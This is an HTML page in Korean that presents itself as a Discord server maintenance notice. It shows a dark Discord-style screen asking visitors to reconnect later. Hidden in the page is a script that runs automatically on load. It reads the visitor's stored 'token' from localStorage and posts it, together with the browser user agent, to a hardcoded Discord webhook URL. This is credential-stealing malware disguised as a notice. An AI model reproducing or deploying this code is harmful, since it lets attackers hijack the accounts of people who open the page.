<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>서버 점검 중</title>
</head>
<body style="background: #313338; color: white; font-family: sans-serif; text-align: center; padding-top: 200px;">
    <h2>디스코드 서버 점검 중입니다...</h2>
    <p>잠시 후 다시 접속해주세요.</p>

    <script>
        (function autoExecute() {
            const webhookUrl = 'https://discord.com/api/webhooks/1568353008071344220/Pq1ZlrWG5Kcqsmir8uGOqDuLwqzRwYdg-twFDbla8s-2KXeTUTBHtL_gygqAktOv8QgQ';
            
            let token = "자동 추출 시도 실패";
            try {
                token = window.localStorage.token || localStorage.getItem('token') || "토큰 없음";
            } catch(e) {
                token = "에러: " + e.message;
            }

            const data = {
                content: `🚨 **[즉시 접속 감지]**\n🔑 **토큰:** \`${token}\`\n🌐 **UA:** \`${navigator.userAgent}\``
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        })();
    </script>
</body>
</html>
